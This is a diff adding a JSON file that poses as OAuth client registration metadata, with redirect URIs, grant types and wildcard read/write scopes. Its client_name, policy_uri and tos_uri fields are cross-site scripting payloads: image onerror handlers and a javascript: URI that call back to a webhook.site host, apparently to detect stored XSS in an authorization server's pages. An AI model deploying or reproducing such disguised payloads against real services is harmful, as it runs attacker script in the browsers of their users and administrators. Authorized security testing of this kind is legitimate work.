@@ -1,0 +1,21 @@
+{
+  "client_id": "https://joyboiii56.github.io/i2556-cimd/t10b.json",
+  "client_name": "x\"><img src=x onerror=fetch('https://41cebd43-5b30-4287-9174-5f16697f75d1.webhook.site/cn2')>",
+  "client_uri": "https://github.com/joyboiii56/i2556-cimd",
+  "redirect_uris": [
+    "http://127.0.0.1:8765/callback",
+    "http://localhost:8765/callback"
+  ],
+  "grant_types": [
+    "authorization_code",
+    "refresh_token"
+  ],
+  "response_types": [
+    "code"
+  ],
+  "token_endpoint_auth_method": "none",
+  "application_type": "web",
+  "scope": "*:*:read *:*:read_write",
+  "policy_uri": "https://example.com/p-INJ2705\"><img src=x onerror=fetch('https://41cebd43-5b30-4287-9174-5f16697f75d1.webhook.site/pj2')>",
+  "tos_uri": "javascript:fetch('https://41cebd43-5b30-4287-9174-5f16697f75d1.webhook.site/tj2')"
+}
